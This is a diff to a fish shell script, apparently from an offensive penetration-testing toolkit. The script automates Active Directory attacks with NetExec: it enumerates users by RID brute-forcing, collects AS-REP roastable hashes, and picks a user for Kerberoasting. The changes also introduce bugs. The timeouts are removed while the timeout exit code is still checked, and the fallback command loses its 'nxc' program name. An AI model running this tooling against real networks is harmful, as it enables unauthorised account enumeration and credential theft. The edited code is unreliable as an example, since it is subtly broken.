@@ -105,8 +105,10 @@ Examples:
     
     # Set users file name based on extracted domain
     set users_file "$target"_users.txt
+    set users_file_mini "$target"_users-mini.txt
     if test -n "$domain"
         set users_file "$domain"_users.txt
+        set users_file_mini "$domain"_users-mini.txt
     end
 
     # Build nxc command arguments
@@ -121,7 +123,7 @@ Examples:
     # User Enumeration - prioritize --rid-brute over --users
     ezpz_header "Enumerating users with RID Bruteforcing"
     ezpz_cmd "nxc smb $nxc_args --rid-brute 10000"
-    timeout 120 nxc smb $nxc_args --rid-brute 10000 2>/dev/null | grep 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
+    nxc smb $nxc_args --rid-brute 10000 2>/dev/null | grep 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
     
     if test $pipestatus[1] -eq 124
         ezpz_warn "Operation timed out. Skipping."
@@ -134,13 +136,12 @@ Examples:
         # Fallback to --users
         ezpz_header "Enumerating users (fallback)"
         ezpz_cmd "nxc smb $nxc_args --users"
-        timeout 60 nxc smb $nxc_args --users 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
+        smb $nxc_args --users 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
         
         if test $pipestatus[1] -eq 124
             ezpz_warn "Operation timed out. Skipping."
         else if test -s $users_temp
             # Extract just usernames and save to file with -mini suffix
-            set users_file_mini (string replace '.txt' '-mini.txt' $users_file)
             cat $users_temp | awk '{print $1}' > $users_tmp
             cp $users_tmp $users_file_mini
             ezpz_info "Saving enumerated users to $users_file_mini"
@@ -257,7 +258,7 @@ Examples:
             ezpz_info "Saving hashes to $asrep_file"
             
             # Extract first AS-REP roastable user for Kerberoasting
-            set asrep_user (echo $hash_lines[1] | grep -oE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f3)
+            set asrep_user (echo $hash_lines[1] | grep -oE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f4)
             if test -n "$asrep_user"
                 ezpz_header "Searching for Kerberoastable accounts using AS-REP user"
                 set kerb_file "$target"_kerb.hash
